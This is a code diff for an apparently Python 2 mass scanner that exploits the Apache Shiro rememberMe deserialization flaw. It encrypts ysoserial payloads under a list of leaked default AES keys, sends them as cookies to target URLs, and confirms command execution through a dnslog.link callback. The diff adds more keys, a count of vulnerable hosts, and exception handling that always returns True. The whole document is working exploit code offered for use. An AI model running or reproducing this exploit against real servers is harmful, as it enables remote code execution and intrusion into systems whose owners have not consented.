@@ -1,4 +1,5 @@
-#coding: utf-8
+#!/usr/bin/env python
+# -*- encoding: utf-8 -*-
 
 import os
 import re
@@ -14,6 +15,7 @@ import warnings
 warnings.filterwarnings("ignore")
 JAR_FILE = './ysoserial-0.0.6-SNAPSHOT-all.jar'
 scan_count = 0
+vuln_count = 0
 
 def poc(url, rce_command,key_):
     if '://' not in url:
@@ -25,8 +27,8 @@ def poc(url, rce_command,key_):
         r = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=10,verify=False)  # 发送验证请求
         # print r.text
     except Exception, e:
-        pass
-    return False
+        return True
+    return True
 
 
 def generator(command, fp,key_):
@@ -36,18 +38,6 @@ def generator(command, fp,key_):
                              stdout=subprocess.PIPE)
     BS = AES.block_size
     pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
-    # key = "kPH+bIxk5D2deZiIxcaaaA=="
-    '''
-    kPH+bIxk5D2deZiIxcaaaA==
-    wGiHplamyXlVB11UXWol8g==
-    2AvVhdsgUs0FSA3SDFAdag==
-    4AvVhmFLUs0KTA3Kprsdag==
-    3AvVhmFLUs0KTA3Kprsdag==
-    Z3VucwAAAAAAAAAAAAAAAA==
-    U3ByaW5nQmxhZGUAAAAAAA==
-    wGiHplamyXlVB11UXWol8g==
-    6ZmI6I2j5Y+R5aSn5ZOlAA==
-    '''
     mode = AES.MODE_CBC
     iv = uuid.uuid4().bytes
     encryptor = AES.new(base64.b64decode(key_), mode, iv)
@@ -64,9 +54,9 @@ def random_str(len):
 
 #查看dnslog状态
 def getdnslog(random_str):
-    dns_check = 'https://admin.dnslog.link/api/dns/xxxxxx/%s/' % random_str#xxxxxx为你的dns字符串，地址https://admin.dnslog.link
+    dns_check = 'https://admin.dnslog.link/api/dns/xxxxxxx/%s/' % random_str#xxxxxxx为dnslog地址
     res = requests.get(dns_check)
-    return res.text
+    return res.text.strip()
 
 #检查是否执行dnslog成功
 def check_vuln():
@@ -75,13 +65,16 @@ def check_vuln():
     'wGiHplamyXlVB11UXWol8g==',
     '2AvVhdsgUs0FSA3SDFAdag==',
     '4AvVhmFLUs0KTA3Kprsdag==',
+    'fCq+/xW488hMTCD+cmJ3aQ==',
     '3AvVhmFLUs0KTA3Kprsdag==',
+    '1QWLxg+NYmxraMoxAXu/Iw==',
+    'ZUdsaGJuSmxibVI2ZHc9PQ==',
     'Z3VucwAAAAAAAAAAAAAAAA==',
     'U3ByaW5nQmxhZGUAAAAAAA==',
     'wGiHplamyXlVB11UXWol8g==',
     '6ZmI6I2j5Y+R5aSn5ZOlAA=='
     }
-    global scan_count
+    global scan_count,vuln_count
     while True:
         try :
             web_url = queue.get(timeout=0.1)
@@ -89,12 +82,17 @@ def check_vuln():
         except:
             break
         try:
-            random_str_ = random_str(8)
+            
             for key_ in key:
-                poc(web_url,random_str_+".xxxxxx.dnslog.link",key_)#xxxxxx为你的dns字符串，地址https://admin.dnslog.link
+                random_str_ = random_str(8)
+                connect = poc(web_url,random_str_+".xxxxxxx.dnslog.link",key_)#xxxxxxx为dns地址
+                if connect == False:
+                    break
                 result = getdnslog(random_str_)
+                # print result,random_str_,key_
                 if result == 'True':
                     print "[+200] vuln apache shiro",web_url,key_
+                    vuln_count+=1
                     break
                 else:
                     pass
@@ -132,8 +130,8 @@ if __name__ == '__main__':
         for t in threads:
             t.join()
     else:
-    	queue = Queue.Queue()
+        queue = Queue.Queue()
         queue.put(args.u)
         check_vuln()
-    print ('[+]Done. %s weburl scanned in %.1f seconds.' % (scan_count,time.time() - start_time))
+    print ('[+]Done. %s weburl scanned %s available %.1f seconds.' % (scan_count,vuln_count,time.time() - start_time))
 
